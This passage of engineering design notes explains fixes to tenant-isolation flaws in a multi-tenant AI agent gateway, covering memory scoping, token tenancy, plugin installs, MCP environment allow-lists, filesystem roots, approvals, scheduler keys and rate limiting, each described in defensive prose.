The semantic tier is bound per workspace at composition instead: one
`agentMemoryVectorAdapter` per workspace, each carrying its tenant, over the
shared vector store that already scopes internally. That resolves a TODO left
in `adapters.go` when the vector store was scoped — it had been pinned to
personal precisely because `agentmemory` could not yet name a tenant.

### The memory archive's frozen read surface meant "personal", and a tenant was getting it

`sdk/storage.MemoryBackend` is frozen for this SDK major version, so its
`Search`/`ReadGlobal`/`ReadByScope` take no workspace and the shipped shims
resolve them to personal. `WorkspaceMemoryBackend` was added alongside for
tenant-aware callers — and then nothing asserted for it.

`Engine.MemoryList(agentID, limit)` and `MemorySearch(...)`, described in their
own comment as "called by the gateway API handlers", called the frozen methods
directly. So `GET /memory/:agent_id` served every tenant the **personal**
workspace's archived memories while hiding the caller's own — wrong in both
directions. The delete handler immediately below it,
`handleDeleteMemorySession`, had been workspace-scoped the whole time. Reading
and erasing the same records through two different scopes is how one of them
ends up wrong, and it was the read.

Both accessors now take a workspace, and there is no unscoped variant left —
the same choice as `Engine.BrainStore()`. Backends that cannot answer per
tenant (the external sidecar in `internal/extstorage` implements only the
frozen interface) return `ErrMemoryArchiveNotTenantAware` for a tenant rather
than substituting personal, while personal itself keeps working, because
personal is exactly what the frozen methods mean.

### `BEGIN DEFERRED` fails the loser instead of making it wait

Two stores read a row and then wrote based on it inside one transaction:
`session_owners` (claim a session ID) and `rulebook_versions` (assign the next
version number). Both used `BeginTx(ctx, nil)`, which is `BEGIN DEFERRED`.

A deferred transaction takes a read lock at the `SELECT` and tries to upgrade
at the `INSERT`. When several do this at once SQLite **cannot** let them wait —
waiting would deadlock — so it fails the upgraders immediately with
`SQLITE_BUSY`, bypassing the busy timeout entirely. Raising `BusyTimeout` does
nothing; the symptom is "database is locked" on a store that looks correctly
transactional.

For session ownership the consequence was not merely a confusing error. The
mutation test shows it plainly: *the rightful owner's own idempotent re-claim*
gets refused with "database is locked", and a genuine loser gets a 500 instead
of the `ErrSessionClaimed` the caller is meant to translate into "that ID is
taken". Session ownership is the store that stops one tenant occupying
another's session ID, so a spurious failure there is not cosmetic.

`sqlitex.Options.ImmediateTx` adds `_txlock=immediate`, and both stores set it.
Opt-in rather than default because it serialises read-only transactions on the
same handle too — a real cost for read-heavy stores and no benefit to ones
whose transactions open with a write.

One test-quality note, again. The first version of the rulebook test drove
`CompositeStore.UpdateProceduralVersioned`, which writes `procedural.md` first
under a mutex — enough stagger that the test passed *with the bug present*. It
now drives `RuleLog.Append`, where the contention actually is, and fails
reliably when the fix is reverted.

### A locally-issued token said who, never where

`Issuer.Issue(subject, email, role)` was the only constructor, and the Claims
it built carried no tenancy at all. So every token minted by `/auth/token` and
by the OIDC sign-in flow had an empty `WorkspaceID`, authenticated perfectly,
and then resolved to the personal workspace everywhere downstream.

That is not an authentication failure, which is what makes it dangerous: a
signed-in member of `ws_a` acting with personal's authority is a *valid*
credential for the wrong tenant. Nothing in the request looks wrong. It also
completed the fail-open shape found earlier in `rbac/middleware.go` — that fix
made the claims branch read `claims.WorkspaceID`, and this is why the field was
always empty when it did.

`TokenIdentity` groups the tenancy so it is written down at the call site
rather than being the shape of an omission, and `IssueFor` replaced `Issue`
outright rather than sitting beside it.

Two decisions inside the fix:

- **A refresh re-reads the membership.** A refresh family lives for days, so
  replaying the tenancy minted at sign-in would let a member who moved
  workspaces, or was demoted, keep acting under the authority they had then.
  `Reauthorizer` returns the *current* identity. The subject is the one field
  the resolver may not change — it identifies the family, and letting it be
  swapped would turn refresh into an impersonation primitive.
- **An unresolvable subject is refused, not defaulted.** A resolver that is
  wired and says "no" means the subject authenticated but has no active
  membership. Issuing an un-tenanted token there would hand an outsider the
  personal workspace, which is the deployment's own.

`PrimaryMembership` picks the oldest active membership, because a user can
belong to several and nothing yet lets them choose (MU-029). Oldest is the
stable answer: a member's tokens do not start acting somewhere else because an
admin invited them to a second workspace.

The static API key keeps issuing without tenancy, deliberately — it is a
platform credential from `config.yaml` with no membership behind it, which is
invariant 10's distinction between platform administration and workspace
ownership.

### The tenant of a credential is its principal's, so it is joined, not copied

`tenancy.credentials` has no `workspace_id` column and should not gain one. A
credential belongs to exactly one principal — a user or a service account,
enforced by `CHECK(NUM_NONNULLS(user_id, service_account_id)=1)` — and the
principal belongs to workspaces. A copied `workspace_id` would be a second
source of truth that could disagree with the membership, and the row would win
over the membership that was actually revoked.

The table is write-only today, which is exactly why `CredentialsForWorkspace`
ships now rather than with its first caller. The first read someone adds is the
one that decides whether this table is tenant-scoped, and a plain
`SELECT * FROM credentials` would compile, look complete, and return every
tenant's. The join covers both principal kinds and requires the membership or
service-account binding to be **active**, so revocation takes effect through
the join rather than through a sweep somebody has to remember to run.

### Extension inventory is layered, not replaced (MU-017 criteria 1 and 3)

A skill is executable instruction text an agent follows; a plugin contributes
tools an agent can call. Both loaders were process-wide, so installing either
in one workspace added it to every agent in the deployment, and two tenants'
same-named extensions were resolved by scan order rather than by ownership.
That is not a disclosure bug — it changes what another tenant's agents *do*,
which is exactly what MU-017's user story is written against.

The scan list is **layered**. Platform directories — the operator's configured
dirs and the cross-client `~/.agents` and project-level conventions — stay
visible to every workspace as read-only templates. Each workspace's own
directory is scanned **last**, so it can shadow a platform extension by name
without modifying the shared copy, and installs land only in its own directory.
`TestTheWorkspaceDirectoryIsScannedLast` pins the ordering, because reversing
it is a one-character mistake that silently inverts the override rule.

Personal resolves to the base directory itself, so a single-user installation's
skills and plugins do not move and keep their scan position (invariant 7).

`Engine.SkillLoaders` and `Server.skillCatalog(c)` are the read paths; there is
no unscoped accessor left in either. Three call sites had no request in scope
and were threaded rather than defaulted — `agentPackageRequirements` already
carried an `agentScope`, `groundCatalog` a `studioScope`, and
`installLearningSkill` needed the request for the same reason
`applyLearningProposal` did: it *writes* a skill into a workspace.

**Criterion 3** is `rbac.ActionInstall`. Using an extension runs code somebody
already vetted; installing one chooses whose code runs. A developer who may
author a local skill has not thereby been trusted to pull an arbitrary package
off the internet into everyone else's runtime — and before this both were
`ActionWrite`, so they were the same permission. Owner and admin may install;
developer keeps authoring and everyone keeps reading, which the test asserts
explicitly so the split cannot quietly become a permission removal.

### An approval has to be about identifiable code (MU-017 criterion 2)

Most of criterion 2 already existed: `internal/plugininstall` stages into a
directory the loader never scans, requires a sha256 for archive installs, runs
the E20 safety pipeline over the staged tree, and activates nothing until
`Approve`. `Gate` plus `Fingerprint` covers criterion 6 — a manifest whose
permissions change stops loading until a human re-approves, and the
fingerprint is order-insensitive so reordering grants is not treated as a
change while widening one is.

What was missing was the pin. A git install did `git clone --depth 1 <url>`,
so the approval recorded "installed from that URL" — and a URL is a moving
target. The branch tip advances and the approval now attests to code nobody
can identify. `Meta.Revision` records the commit the clone actually landed on,
read out of the working tree before `.git` is discarded, and a source may name
a revision as `<url>#<rev>` to install a specific commit rather than whatever
the tip happens to be. A raw SHA needs init/fetch/checkout rather than
`--branch`, so both paths exist.

`isGitSource` had to learn about the suffix too — without that, pinning a
commit made the source unrecognisable and fell through to "not a git URL,
archive, or directory". Cheap to miss, and it would have made the feature
appear broken rather than unsafe.

The installer also became per workspace. A single root meant one tenant's
approval activated a plugin for the whole deployment: the prompt names one
operator, the consequence lands on everyone. It also meant two tenants could
not install a plugin with the same ID — the second got "already installed",
which is a cross-tenant name conflict wearing an ordinary error message.
`requireInstaller` refuses when a workspace's own root cannot be created
rather than falling back to the shared one, since that fallback is the bug.

### An MCP server was inheriting every credential the gateway holds

`newStdio` built its child environment from `os.Environ()`. So every MCP
server — third-party code, installed by whoever — received the gateway's
entire environment: provider API keys, the static server key, database DSNs,
whatever cloud credentials the host had. An MCP server is precisely the
component you install *because* you did not want to write it yourself, so
"inherits everything we hold" is the wrong default with one tenant, and with
several it is one tenant's extension holding another tenant's keys.

The child environment is now an allow-list: what a process needs to run at all
(`PATH`, `HOME`, locale, `TMPDIR`), the TLS trust store and proxy settings
(without which every HTTPS call fails in a way that looks like a network
fault), interpreter search paths, and whatever the operator named in
`inherit_env`. Everything else is withheld and **counted** in a log line —
counted rather than named, because a variable name is itself a hint about what
a deployment holds.

Membership, not pattern-matching. A deny-list of `*_KEY`, `*_TOKEN`, `*_SECRET`
is a guess about naming conventions, and the one credential whose variable is
called something else is the one that leaks.

`inherit_all_env` restores the old behaviour. It exists so a deployment that
depended on inheritance has a documented way back, not because it is safe.

### Revocation, in two steps whose order is the point (MU-017 criterion 7)

`RemoveServer` used to close the transport while holding the client lock, and
`close()` called `Kill` and returned. Two problems, one visible and one not.

The invisible one: no `Wait`. Every removed or hot-replaced server left a
zombie until the gateway itself exited. Nothing broke, which is why it
survived — the process table simply grew on any deployment that reconfigures
MCP servers.

The visible one is the ordering. The server now leaves the registry **first**,
under the lock, so no new invocation can find it — revocation has to take
effect immediately. Draining and shutdown happen **outside** the lock, because
holding the client lock across a stranger's tool call would freeze every other
MCP operation: one revoked extension wedging the rest is a worse failure than
the one being fixed.

The drain is bounded. An extension that never returns must not make revoking
it impossible, which is the opposite of what revocation is for. Shutdown then
escalates stdin-EOF → SIGTERM → SIGKILL, terminating before killing so a
server holding a lock or a partial file can release it: a revoked extension
should stop running, not be made to corrupt something on the way out.

The bound needed a clock assertion to be real. The first version of the test
only checked that revocation *completed*, which an unbounded wait also does —
as soon as the stuck call hits its own context deadline. It now fails if
revocation waits on the extension rather than on its own budget.

### The plugin credential delegator was already careful, and still wrong

`internal/plugins/delegation.go` does most of MU-017 criterion 4 well and has
for a while: a sidecar receives a minimal allow-listed base environment plus
*exactly* the credentials its manifest declared, references outside the
plugin's own vault namespace are refused at validation before any read
happens, and rotation is detected by hashing rather than by holding values.

And it read `wsroot.PersonalWorkspaceID` unconditionally. The vault takes a
workspace and has for some time; this resolver passed the same constant every
time. So a plugin wired for any tenant was handed the personal workspace's
secrets — the same substitution the memory archive was making, with the same
shape: the call succeeds, the sidecar starts, and it is holding the wrong
tenant's credential.

Worth recording because the surrounding code is *good*. Namespace validation,
value-free logging, hash-based rotation detection — all correct, all pointed at
the wrong tenant. Care about one axis is not care about another, and a review
that reads this file admiringly can still miss the constant.

The rotation watch had to move with it. Watching a different workspace than
the spawn env reads would mean a tenant's rotation is never noticed while an
unrelated workspace's rotation restarts their sidecar for no reason — the test
asserts both directions, because only checking that rotation is *detected*
would pass with the bug.

### A channel connection is somebody's, and the registry did not know whose (MU-018)

A channel connection is a bot token, a webhook URL, or a signed-in account —
one tenant's Slack app, their Telegram bot, their inbox. The registry keyed
adapters by channel ID alone, so nothing in the process recorded whose
connection it was: inbound messages arrived with no tenant, and an outbound
send routed on the channel name for whoever asked.

**Inbound identity is stamped after the adapter, not by it.** Adapters used to
write straight into the shared inbox. An adapter receives whatever an external
sender wrote — display name, user ID, body, and, for a hostile or merely buggy
adapter, any field it chooses to fill in. Each adapter now gets its own channel
whose messages are re-stamped with the *connection's* workspace before reaching
the inbox. That is the difference between a rule saying content must not select
a tenant and there being no code path in which it can. The test sends a message
claiming `ws_victim` through a connection bound to `ws_a`, and with the stamp
removed it arrives as `ws_victim`.

**Ownership is verified at send time, not at admission.** A message can be
minutes or days old by the time it goes out — scheduled deliveries, recovered
runs, retries — and speaking through another tenant's bot is, to the recipient,
indistinguishable from that tenant speaking. The refusal logs the channel, both
workspaces and the agent, and never the body: a refused send is exactly the
case where the content is most likely to be somebody else's.

**Rebinding is refused rather than applied.** A channel changing hands
mid-process would leave in-flight messages attributed to the previous owner and
new ones to the next. A genuine hand-over is a disconnect and a reconnect,
which is visible.

Unbound channels are personal's. Every existing single-tenant deployment binds
nothing and sends messages with no workspace set; both sides normalise to
personal, so the check is invisible to them (invariant 7).

The other side of the check was making replies carry their tenant. Those
stamps are the fail-*closed* direction — a forgotten one is a refused send with
a named reason, not cross-tenant speech — and `channel.send`, the tool an agent
calls with model-chosen arguments, takes its workspace from the run's principal
rather than from the call, because otherwise a prompt could select whose bot
speaks.

Criteria 3 and 5 were already met and are now pinned: sender IDs were never
authority inputs (`internal/runtime/principal.go` says so, and the routing test
shows two messages differing only by sender landing in the same workspace), and
`internal/channels/webhook/sign.go` binds the timestamp *inside* the signed
payload with a tolerance window, which is what makes a captured body
unreplayable rather than merely signed.

### A run is now a record, not a goroutine (MU-020)

Before this a run existed only as a message in an in-memory inbox and a
goroutine processing it. That is enough for a chat request whose caller waits
on the response and nothing else: a restart lost every queued and running job,
a client that disconnected had no way back to its own run, and a retried
submission started the work twice.

`internal/runs` records the facts of *admission* — tenant, exact agent version,
principal and credential, the policy snapshot, the budget reservation — because
each is a fact about that moment which cannot be reconstructed afterwards. An
agent edited an hour later must not change what a finished run is understood to
have done, and an audit asking "was this allowed?" means allowed *then*, not
allowed by the membership that exists at audit time.

Three properties carry their own reasoning:

- **The state machine is one table.** `transitions` is data rather than
  scattered conditionals, so "a finished run never runs again" is checkable by
  reading one map. A cancelled run resurrected into running would execute work
  a person explicitly stopped.
- **The transition's WHERE clause repeats the status it read.** Two workers
  racing to finish the same run would otherwise both read `running` and both
  write a terminal state, and the second would overwrite the first's result.
  The loser is told instead.
- **Idempotency is unique per workspace, not globally.** Keys are
  client-chosen, and two tenants picking `daily-report` is ordinary. A global
  constraint would hand the second one the first one's run — both a leak and a
  lost submission.

### Two idempotency layers, and why the test had to change

The gateway already had an `Idempotency-Key` middleware that replays the
original response verbatim. My first API test asserted the store's semantics
(200 + `replayed: true`) and failed with a byte-identical 202 — because the
middleware served the retry and the handler never ran.

The middleware's guarantee is the stronger one: the client gets exactly the
bytes it would have got the first time. But it is in-memory, capped at 4096
records and TTL'd at 24h, so it does not survive a restart. The store's dedup
is durable and catches the retry that arrives after an eviction or a restart —
precisely when a duplicated run is most expensive and least visible.

The test now asserts both, and exercises the durable half on its own by putting
the key in the body where the response cache cannot see it. Worth recording
because the first version would have "passed" against a system with no durable
dedup at all, as long as the in-memory cache happened to be warm.

### Executing a durable run: claim, run, record — each through the record

A submitted run travels on a `run` pseudo-channel with its id in metadata. It
reaches the same worker pool as everything else, and then behaves differently
in three ways that all come back to the record being the source of truth:

- **The claim is a state transition, not a worker-local flag.** Two workers —
  in the same process or in two — cannot both execute a run, because the loser's
  `queued → running` finds the status already changed. A flag would only have
  been true within one process.
- **The principal comes from the record.** A durable run may start minutes
  later, in a different process, picked up by a worker with no request behind
  it. The recorded principal is the only answer to "who is this running as"
  that is not a guess. A run with no recorded role gets one, because a
  principal with an empty role is denied everything and the run would fail for
  a reason unrelated to what it was asked to do.
- **The outcome is written through `context.WithoutCancel`.** A run that timed
  out still has to record that it timed out; writing through the cancelled
  context would leave it stuck at `running`, which is the one state a reader
  cannot distinguish from "still working".

An unqueueable run is failed rather than left queued. Nothing is going to pick
it up, and a run sitting in `queued` forever is indistinguishable from one
waiting its turn.

### A test that credited the wrong layer

`TestACancellationDuringExecutionIsNotOverwritten` asserts that a run cancelled
mid-flight keeps its cancellation. It passed — and it also passed when I
mutated `finishRun` to *force* the outcome over the cancellation.

The reason is that the guarantee lives in the store's terminal check, not in
the worker: forcing `cancelled → running` on the way back is itself refused. So
the test was crediting `finishRun` for a protection it does not provide, and
would have gone on passing if that branch were deleted.

It now asserts the store transitions directly and says where the property
lives, so a mutation of the real guard fails it. The general shape is worth
remembering: a test can be correct about the outcome and wrong about the
mechanism, and the mutation is what tells the two apart.

### The filesystem was the one store an agent could address by raw string (MU-021)

Every SQL store on this branch became workspace-scoped, and the discovery scan
in `internal/ownership/catalog.go` is what forced each one. It finds `CREATE
TABLE` statements and `Store`/`Archive`/`Vault` types. The host filesystem is
neither. It has no table and no repository type — an agent reaches it by
handing `read_file` a string — so it was never in the inventory, and it stayed
process-global while everything around it was scoped.

`Engine.SetFilesystemRoots` configured **one** allowlist for the whole process,
and `defaultPrivilegedWorkDir` returned **one** scratch directory, which is also
the only host tree the container runner bind-mounts. Two consequences, both
plain cross-tenant access:

- `read_file` in workspace A could read a file `write_file` created in
  workspace B by naming its absolute path. Nothing rejected it, because the
  path was inside the configured root — the root was simply everyone's.
- `shell_exec` in A and `shell_exec` in B ran in the same mounted directory.
  Anything one left behind, the other could read and overwrite.

**The fix is a different root, not another check.** A run resolves paths
against roots derived from the workspace on its context, so a cross-tenant path
fails the containment test that was already there. There is no scoping
predicate a future builtin can forget, because there is no unscoped root left
to pass. `resolveFilesystemPath` now takes a `context.Context`: a caller who
cannot supply one has no business resolving a tenant path, and the compiler
says so.

**Invariant 7 survives because `wsroot.Dir` maps personal to the base itself.**
A single-tenant install's roots are byte-identical to what it configured, its
files do not move, and resolving a path does not even bring a namespace
directory into existence — `TestPersonalWorkspaceRootsAreByteIdenticalTo
Configuration` asserts all three.

**And invariant 7 is exactly what opens the next hole.** Because personal
resolves to the base root, and every named workspace lives *under* it at
`<base>/.workspaces/<id>`, the personal workspace structurally contains every
tenant's tree. The scheduler and channel paths reach the engine with no
principal and fall back to personal — so left alone, containment would have
handed those paths every tenant's files. `denyNamespaceEscape` rejects any
resolved path whose first element below the matched root is the namespace
directory. In a real personal deployment that directory does not exist and the
rule never fires; in a multi-tenant one it is the difference between the
service paths being confined and being universal.

**Mounts narrow, they never widen.** `PrivilegedCommand` gained a `Workspace`
field, but no builtin sets it — `runPrivilegedCommand` stamps it from the run's
context, the same choke-point idiom the checkpoint writer uses, so a builtin
added tomorrow is scoped without its author knowing the rule exists. The Docker
runner treats the field as a *narrowing* of the operator-configured `Root`: a
request naming a tree outside it is refused rather than honoured. A named
workspace whose tree cannot be created gets a refusal, never the shared mount.

**One design choice worth stating, because the obvious alternative is wrong.**
The first version gave each workspace a scratch namespace *beside* its file
tree — `<root>/data/sandbox/.workspaces/<ws>` next to `<root>/.workspaces/<ws>`.
It isolates correctly and it is unusable: `run_script` resolves a script
through the filesystem policy and then runs it with the script's directory as
the working directory, so every script a tenant wrote would resolve fine and
then fail to execute, because the working directory sat outside the mount. A
workspace's mount is therefore its own file tree. It costs nothing in
isolation — that tree is already disjoint from every other tenant's — and
`TestAWorkspaceCanRunTheScriptItJustWrote` pins the property so the sibling
layout cannot come back.

**The catalog now knows about it.** `workspace-files` is a declared resource
and `internal/runtime/workspace_roots.go` a declared repository. Because the
AST scan structurally cannot see it, `Repository` gained an `Undiscoverable`
flag — and, so the flag is not a way to delete any store from the inventory
check by adding one field, `TestUndiscoverableRepositoriesAreTrulyUndiscoverable`
fails if a store the scan *can* see is marked with it.

### Two ways to be wrong about a run whose worker died (MU-021 criterion 6)

The restart sweep counted unfinished runs and left them. Making it act meant
choosing between two failures that point in opposite directions:

- **Re-queue everything.** One crash becomes two payments, two emails, two
  deletions. The run had already called out to the world, and "retry" repeats
  the call.
- **Re-queue nothing.** A run that had not yet done anything is retry-safe by
  construction. Failing it loses work for no safety gain, and an operator who
  restarts learns to expect losses.

Neither is decidable from the status. `running` says a worker *claimed* the
run, not that the run *acted*. So the engine now reports the first
outside-visible call a run makes — at the single tool-dispatch choke point,
**before** the call rather than after, because a tool that starts a transfer
and then times out has still made it — and the record remembers the timestamp
and the tool.

The sweep then has a fact instead of a guess. No marker → re-queued and
re-enqueued. Marker → failed, with the tool named in the reason and the
payload, principal and policy snapshot all intact, because **this is approval,
not prohibition**: an operator who confirms the effect did not land resubmits
it. Attempts exhausted → stops being handed to workers. Paused → left alone,
because that is somebody's decision, not wreckage.

Three details that are easy to get backwards:

- The marker is written through `context.WithoutCancel`. A run killed by its
  own deadline mid-call is precisely the case it exists for, and writing it
  through the dying context would lose the fact that makes the run unsafe.
- `requeue`'s `WHERE` re-checks `side_effect_at IS NULL`. The sweep reads, then
  writes; a worker less dead than the sweep assumed can act in between, and its
  marker has to win. `TestARunThatActsWhileTheSweepIsDecidingIsStillNotRequeued`
  is the guard.
- `attempt` counts **claims**, not re-queues. Incrementing in both places would
  burn two per crash and silently halve the bound.

`running → queued` is deliberately NOT in the state-machine table. Adding it
would make demotion reachable from anywhere, including a live worker's own
code path, and "a run went backwards" would stop being a contradiction the
machine can catch. The sweep owns that SQL, alone.

### A default is only worth what happens when you override it (MU-021 criterion 1)

`runtime.sandbox.mode` already defaulted to `docker`. The override was a
warning line — so one config key would run every tenant's `shell_exec` as the
gateway user, on one shared filesystem, with the gateway's ambient
credentials. That is not weaker isolation; it is its exact negation, reachable
without touching code.

It is now refused in Team and Scale, and **refused rather than silently
upgraded to sandboxing**. An operator who wrote `unsandboxed` and got
isolation anyway would debug the wrong thing for as long as it took them to
find this file; one who gets "privileged tools disabled, here is why, here is
the fix" reads the log line once. Fail closed *and* fail loudly. Personal mode
keeps the hatch — with one tenant there is nobody to isolate from.

The decision is extracted as a pure function (`privilegedIsolationFor`) so the
policy is testable without booting a gateway, and so an unrecognised mode
string falls through to container isolation rather than to the host.

### Scratch space needs a location and a lifetime (MU-021 criteria 2 and 5)

Per-workspace confinement stops one tenant reaching another's files. It says
nothing about one *run* reaching another's, and within a workspace that still
matters: a run writes a decrypted secret, an intermediate result, a downloaded
artifact, and leaves it where the next run — possibly a different member's —
finds it.

A run now gets its own directory and something deletes it when the run ends.
Neither half works alone: a per-run directory nobody cleans up is the same leak
with more instances of it.

Scratch lives *inside* the workspace tree rather than beside it, for the same
reason the mount does — the working directory has to be inside the mount. The
nesting is what lets a run's default working directory be both private to the
run and reachable from the tools that write to it.

Cleanup resolves symlinks before removing, and refuses a path that resolves
outside the workspace. Without that, a run that replaces its own scratch
directory with a symlink turns the cleanup into the escape.

This is **not** a boundary between runs of one workspace — a run that names
another run's scratch path by hand still resolves it, because they are the
same tenant. It is a default location and a lifetime: enough that a run has to
go out of its way to leave something behind, and that what it leaves is
deleted.

### The suite that asks the attacker's question (MU-021 criterion 7)

`internal/runtime/security_isolation_test.go` is the dedicated isolation
suite, run by `make security` and by `go test ./...`. It is deliberately **not**
behind a build tag: a security suite nobody runs by default is a security suite
that is broken and nobody knows.

Every property in it already has a unit test beside the code that enforces it,
and those fail faster. The suite exists because the two fail *differently*. A
unit test fails when an implementation changes; these fail when a
**composition** changes — a new builtin that resolves paths its own way, a
runner that stops honouring the mount bound, a limit that stops being applied.
None of those need to touch the code the unit tests cover.

Each test is named for the escape it attempts, so a failure reads as "this
attack now works": absolute path, traversal in three spellings, the
no-principal fallback, a symlink planted inside the attacker's own workspace,
writing into a neighbour, widening the container mount, a privileged working
directory, and inheriting the gateway's credentials. The noisy-neighbour half
covers relative-path collision, concurrent writers under `-race`, and inheriting
a finished run's scratch.

Criterion 3's seven resource dimensions are asserted **together** in one test,
because a limit that silently stops being applied looks exactly like one that
is — and a partial regression is the common kind, which would otherwise hide
behind the six that still work.

It lives in `package runtime` rather than its own package because driving
privileged builtins from outside would mean exporting a policy-bypassing entry
point from the shipped API. A dedicated package is not worth a permanent hole
in the surface it exists to protect.

### An approval had no workspace, so every admin was an approver (MU-022)

The broker was a map from call ID to channel. That is enough for "the browser
tab that started the run answers a dialog", and it fails in two specific ways
as soon as more than one person is involved.

**A restart lost every pending approval and told nobody.** The record vanished
with the process, and the approvals page simply stopped listing something a
person had been asked to decide.

**And listing and deciding were gated on an `admin` bool computed as "the role
is owner or admin", with no tenant in it.** Passed to the broker as authority,
that made any workspace's admin an approver for every other workspace — and a
reader of their paused calls' *arguments*. Those arguments are the most
sensitive payload the system holds by construction: they are the things
something decided were dangerous enough to stop, and they routinely carry the
exact material MU-015 encrypts at rest.

The record now carries workspace, run, tool, redacted arguments, requester,
required permission, expiry and decision actor. The broker keeps only the
channel; where the two could disagree — has this been decided, may this actor
decide it — the store wins, because it is the one that survives.

**Eligibility is resolved from CURRENT state, at decision time.** A member
removed from the workspace this morning must not release something that paused
last night. The store does not resolve it: `Eligibility.Permits` is a function
the caller supplies from the live RBAC matrix, so there is one definition of
who may do what rather than a second, divergent copy inside an approval store.

**A decider in the wrong workspace gets `ErrNotFound`, not `ErrNotEligible`.**
Distinguishing them would turn approval IDs into an enumeration oracle over
other tenants' paused actions (invariant 8) — for a resource that, until this
story, had no tenant at all.

**Approving is its own permission.** `ResourceApprovals` is a new RBAC resource
rather than a facet of `ResourceChat`, whose `ActionChat` was documented as
"send a message / confirm a tool". Those are not the same authority: releasing
a paused call authorizes an action the requester could not take alone, and a
viewer who may chat has not thereby been trusted to release a privileged shell
command somebody else's agent composed. Owner, admin and operator may decide;
developer may look; viewer gets neither.

**Redaction is deny-by-default on shape, not a blocklist of key names.** A list
of "password, token, secret" fails on the first argument called
`authorization`, `pat`, `bearer` or `x-api-key`, and it fails *silently*. Short
scalars are shown, because an approver has to read the command to judge it;
long ones are summarised; credential-shaped keys are elided at any nesting
depth. The fingerprint is taken over the FULL arguments, so redacting the
durable record does not weaken the binding — `TestTheStoredCopyIsRedactedEven
WhenTheCallerPassesEverything` fails if someone reorders those two lines.

**The channel says a human clicked approve; it does not say what they
approved.** Criterion 5 is `verifyApproved`, which re-checks the fingerprint of
the call actually in hand before executing. Between the request being recorded
and the answer arriving, the call can have changed — a retry that rebuilt the
arguments, a model that re-emitted the call differently, or someone who
arranged for both. It is silent when no store is configured: a personal
deployment has no durable record to check against and the person who clicked
approve is the person watching the run, so failing closed there would break
every personal install to guard against a substitution only a second actor
could perform.

**Resolve records before it wakes.** A broker that woke the run first and wrote
afterwards would let two approvers both release the action: the store's
single-use guard would refuse the second write, but the second wake-up would
already have happened.

**One semantic change worth naming.** The old broker scoped approvals by
*subject* — only the requester could answer their own. That is not routing; it
is a confirmation dialog with extra steps. The boundary is now the workspace
plus the permission, so an eligible colleague can answer, which is what MU-022
asks for. `TestBrokerIsolatesApprovalsByWorkspaceNotByIndividual` states both
halves.

**And one place two implementations nearly diverged.** The store-less path —
a personal deployment with no durable record — has to answer the same "may
this actor decide" question about a map entry. The first version answered it
inline and *omitted the workspace comparison*, reintroducing the exact bug the
record was built to fix; a test caught it. Both paths now call
`approvals.Authorize`.

### The key was the bug (MU-023)

Every map in the scheduler was keyed by agent ID: cron entries, the run lock,
the consecutive-failure counter, the readiness blocks, and the completed-fire
state file. Agent IDs are unique per **workspace**, not per deployment — the
loader has said so since MU-012 — so two tenants with a `daily-report` agent
shared one cron entry. Registering the second silently replaced the first, and
whichever survived ran under a principal belonging to neither. The run lock
made one tenant's long-running agent suppress every other tenant's, and the log
line said "already running" about an agent that was not theirs.

`scheduleKey` is a struct, not a joined string, precisely so the compiler
refuses a bare agent ID where a key is wanted. The old code's bug was passing
exactly that. Legacy single-argument methods remain and resolve to the
scheduler's own workspace, so a personal deployment is unchanged.

**Exactly-once is a claim, not a lock.** An occurrence is identified by the
instant it was scheduled for, so two instances evaluating the same cron
expression compute the same key *without talking to each other*, collide on the
same primary key, and exactly one INSERT wins. Deriving the key from
`time.Now()` or a UUID breaks this silently — every instance would always win.
And there is no lock to acquire, release or leak: an instance that dies
mid-run leaves a row whose lease expires, and the row is the audit trail either
way. A lock would have to be released by the holder, which is the thing that
just crashed.

Three directions the claim has to get right, each with its own test:

- A **live** lease is not stealable. A slow run must not be executed twice
  because the process holding it stopped answering for a while.
- An **expired** lease is. Otherwise an instance that died orphans the work
  permanently.
- A **completed** occurrence is completed forever, however long the lease has
  been gone.

**An unreachable store refuses rather than fires.** Two instances that both
fail to claim would both fire — the exact duplicate execution the mechanism
exists to prevent — and a missed occurrence is recoverable where a duplicated
side effect is not.

**The principal is derived per fire, not read from one field.** The single
`scheduler.principal` was why a multi-user deployment could only be correct by
refusing to fire at all (`RequirePrincipal`): fail-closed, and also
feature-absent. A workspace other than the configured one gets a service
principal scoped to itself, carrying neither the configured tenant's
organization nor its membership — a membership ID is a grant.

**Catch-up is capped, keeps the newest, and reports what it dropped.** Both
extremes are wrong: replaying a week of `*/5` misses is a self-inflicted denial
of service arriving exactly when the system has least capacity; replaying
nothing loses the daily invoice run a deploy overlapped. The detail worth
keeping is that a *silent* cap is the worst of the three — it reads as "we
caught up" when it means "we caught up a bit", so `Missed.Dropped` exists to
make that impossible to report as success. The enumeration walk is bounded
separately from the cap, because "how many we fire" and "how many we look at"
are different failures.

**Timezone is stored and an unresolvable zone is refused.** "07:00" without a
zone is not a time; coercing to UTC fires at a different hour with no error
anywhere.

**One near-miss.** After keying the state file by `(workspace, agent)`, the
missed-cron check still *read* it by agent ID. Every tenant would have looked
like it had never run, and every restart would have replayed everyone's
catch-up. Three existing tests caught it — which is the argument for keeping
catch-up tests that assert suppression, not just replay.

### A limiter keyed by a value the caller supplies (MU-024)

Most of this story already existed. `internal/costs` reserved budget atomically
in the same transaction that read capacity, reconciled actual usage across
cached/reasoning/input/output tokens, and returned a typed rejection carrying
remaining capacity and a reset time. Three of the seven criteria were met
before this work started, and saying so is more useful than re-deriving them.

What was missing came in three pieces, and the middle one is a vulnerability
rather than a gap.

**Budgets had no workspace dimension.** `TryReserve` had always carried the
tenant predicate, so a ceiling was *enforced* per workspace — but its VALUE
came from one flat process-wide config applied identically to every tenant. An
operator could not give one customer a larger budget than another, could not
express an organization ceiling above its workspaces, and could not cap a
single expensive model. `internal/quota` resolves limits across six levels;
`applyQuotaPolicy` tightens the flat config with them and **never loosens it**,
because a per-workspace entry that raised the deployment ceiling would be the
"narrower scope licenses more" inversion the precedence design exists to
reject.

**The rate limiter's agent bucket was keyed `"agent:" + agentID`, and the agent
ID is read from the request body.** Two consequences, the second worse than the
first. Agent IDs are unique per workspace, so two tenants' `support-bot`
already shared a bucket by accident. And because the ID came from the body
rather than from anything verified, a member of one workspace could name
**another tenant's** agent and burn its rate-limit budget deliberately — a
cross-tenant denial of service needing no credential beyond a valid session of
one's own.

The fix is not to validate the body value. It is to prefix every key with a
workspace nobody can assert. A body field then selects a bucket *within the
caller's own tenant*, where naming your own agents is exactly what the limiter
is for.

**Provider concurrency was a plain semaphore, and first-come is not a
scheduling policy so much as the absence of one.** A tenant with a hundred
queued runs took every slot and held it while everyone waited — without
exceeding any budget, because it was not spending faster than allowed, only
first. Budgets bound how much; they say nothing about who goes next.
